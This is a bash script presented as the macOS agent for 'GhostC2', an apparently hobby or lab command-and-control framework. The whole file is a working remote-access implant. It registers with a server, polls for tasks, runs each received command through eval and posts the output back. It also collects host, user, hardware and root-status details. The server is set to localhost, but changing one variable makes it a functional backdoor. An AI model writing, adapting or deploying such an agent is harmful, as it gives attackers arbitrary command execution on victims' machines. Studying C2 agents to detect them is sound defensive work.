#!/bin/bash

# GhostC2 Mac Agent
# This script acts as a macOS agent for the GhostC2 C2 framework

AGENT_ID="mac_agent_$(hostname)_$(date +%s)"
SERVER="http://localhost:8080"
INTERVAL=15  # seconds

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Logging function
log() {
    echo -e "${GREEN}[*]${NC} $1"
}

error() {
    echo -e "${RED}[!]${NC} $1"
}

warn() {
    echo -e "${YELLOW}[!]${NC} $1"
}

# Check if curl is available
if ! command -v curl &> /dev/null; then
    error "curl is required but not installed. Please install curl first."
    exit 1
fi

# Check if jq is available (for JSON parsing)
if ! command -v jq &> /dev/null; then
    warn "jq is not installed. JSON parsing will be limited."
    JQ_AVAILABLE=false
else
    JQ_AVAILABLE=true
fi

# Register agent with server
register_agent() {
    log "Registering agent with ID: $AGENT_ID"
    
    response=$(curl -s "$SERVER/register?id=$AGENT_ID" 2>/dev/null)
    if [ $? -eq 0 ]; then
        log "Successfully registered with server"
        return 0
    else
        error "Failed to register with server"
        return 1
    fi
}

# Get command from server
get_command() {
    response=$(curl -s "$SERVER/get-task?id=$AGENT_ID" 2>/dev/null)
    
    if [ $? -eq 0 ] && [ -n "$response" ]; then
        if [ "$JQ_AVAILABLE" = true ]; then
            command=$(echo "$response" | jq -r '.command // empty' 2>/dev/null)
        else
            # Basic parsing without jq
            command=$(echo "$response" | grep -o '"command":"[^"]*"' | cut -d'"' -f4)
        fi
        
        if [ -n "$command" ] && [ "$command" != "null" ]; then
            log "Received command: $command"
            echo "$command"
            return 0
        fi
    fi
    
    return 1
}

# Execute command and capture output
execute_command() {
    local cmd="$1"
    local output=""
    
    log "Executing: $cmd"
    
    # Execute command and capture both stdout and stderr
    output=$(eval "$cmd" 2>&1)
    local exit_code=$?
    
    # Add exit code to output
    if [ $exit_code -ne 0 ]; then
        output="Exit Code: $exit_code"$'\n'"$output"
    fi
    
    echo "$output"
}

# Send result to server
send_result() {
    local output="$1"
    
    # Create JSON payload
    local json_data="{\"agent_id\":\"$AGENT_ID\",\"output\":\"$(echo "$output" | sed 's/"/\\"/g' | tr '\n' '\\n')\",\"time\":\"$(date '+%Y-%m-%d %H:%M:%S')\"}"
    
    response=$(curl -s -X POST "$SERVER/submit-result" \
        -H "Content-Type: application/json" \
        -d "$json_data" 2>/dev/null)
    
    if [ $? -eq 0 ]; then
        log "Result sent successfully"
    else
        error "Failed to send result"
    fi
}

# Get macOS system information
get_mac_system_info() {
    echo "=== macOS System Information ==="
    echo "Hostname: $(hostname)"
    echo "OS: $(uname -s)"
    echo "Kernel: $(uname -r)"
    echo "Architecture: $(uname -m)"
    echo "User: $(whoami)"
    echo "Current Directory: $(pwd)"
    echo "Shell: $SHELL"
    
    # macOS specific information
    if command -v sw_vers &> /dev/null; then
        echo "macOS Version: $(sw_vers -productVersion)"
        echo "Build Version: $(sw_vers -buildVersion)"
    fi
    
    if command -v system_profiler &> /dev/null; then
        echo "Model: $(system_profiler SPHardwareDataType | grep "Model Name" | awk -F': ' '{print $2}')"
        echo "Processor: $(system_profiler SPHardwareDataType | grep "Processor Name" | awk -F': ' '{print $2}')"
        echo "Memory: $(system_profiler SPHardwareDataType | grep "Memory" | awk -F': ' '{print $2}')"
    fi
    
    echo "Uptime: $(uptime)"
    
    # Disk usage (macOS specific)
    if command -v df &> /dev/null; then
        echo "Disk Usage: $(df -h / | tail -1 | awk '{print $5}')"
    fi
    
    # Check if running as root
    if [ "$EUID" -eq 0 ]; then
        warn "Running as root user"
    fi
}

# Check for macOS specific tools
check_mac_tools() {
    log "Checking macOS tools availability..."
    
    local tools=("sw_vers" "system_profiler" "defaults" "osascript" "say")
    local available_tools=()
    
    for tool in "${tools[@]}"; do
        if command -v "$tool" &> /dev/null; then
            available_tools+=("$tool")
        fi
    done
    
    if [ ${#available_tools[@]} -gt 0 ]; then
        log "Available macOS tools: ${available_tools[*]}"
    fi
}

# Main loop
main() {
    log "GhostC2 Mac Agent Starting..."
    log "Agent ID: $AGENT_ID"
    log "Server: $SERVER"
    log "Polling interval: ${INTERVAL}s"
    
    # Display system information
    get_mac_system_info
    
    # Check available tools
    check_mac_tools
    
    # Register with server
    if ! register_agent; then
        error "Failed to register with server. Exiting."
        exit 1
    fi
    
    log "Starting command polling loop..."
    
    while true; do
        # Get command from server
        command=$(get_command)
        
        if [ $? -eq 0 ] && [ -n "$command" ]; then
            # Execute command
            output=$(execute_command "$command")
            
            # Send result back to server
            send_result "$output"
        fi
        
        # Wait before next poll
        sleep $INTERVAL
    done
}

# Handle script interruption
trap 'log "Agent stopped by user"; exit 0' INT TERM

# Check if server is reachable
if ! curl -s "$SERVER" >/dev/null 2>&1; then
    error "Cannot reach server at $SERVER"
    error "Make sure the GhostC2 server is running"
    exit 1
fi

# Start the agent
main 